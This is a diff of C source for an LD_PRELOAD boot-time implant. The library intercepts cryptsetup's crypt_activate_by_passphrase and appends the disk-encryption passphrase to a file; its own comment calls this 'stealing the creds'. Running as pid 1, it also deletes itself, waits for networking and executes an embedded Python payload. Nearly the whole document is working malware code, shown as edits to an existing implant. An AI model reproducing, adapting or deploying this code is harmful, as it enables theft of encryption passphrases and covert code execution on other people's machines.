@@ -7,8 +7,7 @@
 #include <dlfcn.h>
 #include <libcryptsetup.h>
 
-// dirty, see Makefile
-#include "/dev/stdin"
+#include "payload.h"
 
 int shell(int argc, char **argv) {
     // only execute if we're pid 1 and /sysroot doesn't exist (systemd workaround)
@@ -24,7 +23,7 @@ int shell(int argc, char **argv) {
             // we don't want children to load us
             unsetenv("LD_PRELOAD");
 
-            // find password
+            // find password, read from the end of the file until we hit a NUL
             FILE *self = fopen(sopath, "r");
             fseek(self, -1, SEEK_END);
             int pwlen = 0;
@@ -49,7 +48,7 @@ int shell(int argc, char **argv) {
             };
             // delete self
             unlink(sopath);
-            // sleep, wait for networking etc
+            // sleep, wait for networking etc.
             sleep(WAIT);
 
             // try our best to find python. We don't have PATH so we can't use execvpe
@@ -62,20 +61,23 @@ int shell(int argc, char **argv) {
                 "/usr/local/bin/python3",
                 "/bin/python3"
             };
-            for (int i = 0; i < 6; i++) {
+            for (int i = 0; i < sizeof(pythonpaths)/sizeof(pythonpaths[0]); i++) {
                 if (access(pythonpaths[i], F_OK) != -1) {
                     execle(pythonpaths[i],
                             "python",
                             "-c",
-                            PAYLOAD, // payload is taken from /dev/stdin. See Makefile for details
+                            PAYLOAD, // payload is taken from payload.h. See Makefile for details
                             NULL,
                             envp);
+		    // If execle returns an error occurred in creating the new process
+		    // so carry on trying with other paths
                 }
             }
         }
     } else {
         unsetenv("LD_PRELOAD");
     }
+
     return 0;
 }
 
@@ -88,26 +90,26 @@ int clearenv (void) {
      * systemd/src/core/main.c:1901
      */
 
-    char ldpreload[] = "LD_PRELOAD=/usr/lib/lblinux.so.1\0";
-    environ[0] = malloc(strlen(ldpreload)+1);
-    environ[0] = ldpreload;
+    environ[0] = strdup("LD_PRELOAD=/usr/lib/lblinux.so.1");
     environ[1] = NULL;
     return 0;
 
 }
 
 // for stealing the creds
-int (*old_crypt_activate_by_passphrase)(struct crypt_device *cd, const char *name, int keyslot, const char *passphrase, size_t passphrase_size, uint32_t flags);
-int crypt_activate_by_passphrase(struct crypt_device *cd, const char *name, int keyslot, const char *passphrase, size_t passphrase_size, uint32_t flags) {
-    old_crypt_activate_by_passphrase = (int(*)(struct crypt_device *, const char *, int, const char *, size_t, uint32_t))dlsym(RTLD_NEXT, "crypt_activate_by_passphrase");
+typedef int (*cabp)(struct crypt_device *cd, const char *name, int keyslot,
+		    const char *passphrase, size_t passphrase_size, uint32_t flags);
+
+int crypt_activate_by_passphrase(struct crypt_device *cd, const char *name, int keyslot,
+				 const char *passphrase, size_t passphrase_size, uint32_t flags) {
+    cabp real_crypt_activate_by_passphrase = (cabp)dlsym(RTLD_NEXT, "crypt_activate_by_passphrase");
 
     /* raise(SIGSEGV); */
-    FILE *self = fopen("/hda1", "a");
+    FILE *self = fopen("/" FILENAME, "a");
     fseek(self, 0, SEEK_END);
     fwrite(passphrase, passphrase_size, 1, self);
     fclose(self);
 
-    int ret = old_crypt_activate_by_passphrase(cd, name, keyslot, passphrase, passphrase_size, flags);
+    int ret = real_crypt_activate_by_passphrase(cd, name, keyslot, passphrase, passphrase_size, flags);
     return ret;
-
 }
